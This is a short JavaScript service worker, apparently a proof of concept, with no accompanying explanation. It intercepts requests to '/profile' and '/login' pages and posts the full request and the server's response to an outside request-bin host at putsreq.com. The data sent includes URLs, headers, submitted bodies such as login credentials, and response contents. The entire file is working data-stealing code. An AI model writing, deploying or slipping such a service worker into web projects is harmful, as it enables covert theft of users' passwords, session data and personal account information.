self.addEventListener("fetch", async (event) => {
  if (
    event.request.url.indexOf("/profile") !== -1 ||
    event.request.url.indexOf("/login") !== -1
  ) {
    const response = await fetch(event.request);
    fetch(`https://putsreq.com/QFPqFV4PZuKNFZuXagXx?url=${event.request.url}`, {
      method: "POST",
      body: JSON.stringify({
        url: event.request.url,
        method: event.request.method,
        headers: event.request.headers,
        body: await event.request.clone().text(),
        response: {
          headers: response.headers,
          body: await response.text(),
        },
      }),
    });
  }
});

console.log("HERE");
